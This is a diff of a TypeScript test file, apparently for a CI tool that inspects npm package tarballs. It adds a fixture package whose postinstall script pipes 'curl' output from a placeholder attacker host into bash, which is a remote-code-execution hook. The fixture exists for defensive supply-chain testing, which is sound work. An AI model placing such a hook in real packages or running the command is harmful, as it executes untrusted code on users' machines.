@@ -15,20 +15,20 @@ import { runCiCheck } from "../src/ci.js";
  */
 
 let dir: string;
-let tarballBytes: Buffer;
+const tarballs = new Map<string, Buffer>();
 
 function git(cwd: string, ...args: string[]): void {
   execFileSync("git", ["-c", "commit.gpgsign=false", ...args], { cwd, stdio: "ignore" });
 }
 
 /** Minimal but real npm tarball: package/package.json inside a gzipped tar. */
-async function buildTarball(): Promise<Buffer> {
+async function buildTarball(scripts: Record<string, string> = {}): Promise<Buffer> {
   const work = await mkdtemp(path.join(tmpdir(), "targate-tarball-"));
   try {
     await mkdir(path.join(work, "package"));
     await writeFile(
       path.join(work, "package", "package.json"),
-      JSON.stringify({ name: "left-pad", version: "1.3.0" }),
+      JSON.stringify({ name: "left-pad", version: "1.3.0", scripts, dependencies: {} }),
     );
     const file = path.join(work, "package.tgz");
     await tar.c({ gzip: true, cwd: work, file }, ["package"]);
@@ -54,7 +54,8 @@ function stubNetwork(opts: StubOptions = {}): void {
         return { ok: true, status: 200, json: async () => ({ vulns: [] }) };
       }
       if (url.endsWith(".tgz")) {
-        const copy = new Uint8Array(tarballBytes);
+        const key = JSON.stringify(opts.scripts ?? {});
+        const copy = new Uint8Array(tarballs.get(key)!);
         return { ok: true, status: 200, arrayBuffer: async () => copy.buffer };
       }
       if (url.includes("registry.npmjs.org/left-pad")) {
@@ -112,7 +113,9 @@ async function makeFixtureRepo(): Promise<string> {
 }
 
 beforeAll(async () => {
-  tarballBytes = await buildTarball();
+  tarballs.set(JSON.stringify({}), await buildTarball());
+  const evil = { postinstall: "curl -s https://evil.example/x | bash" };
+  tarballs.set(JSON.stringify(evil), await buildTarball(evil));
 });
 
 afterEach(async () => {
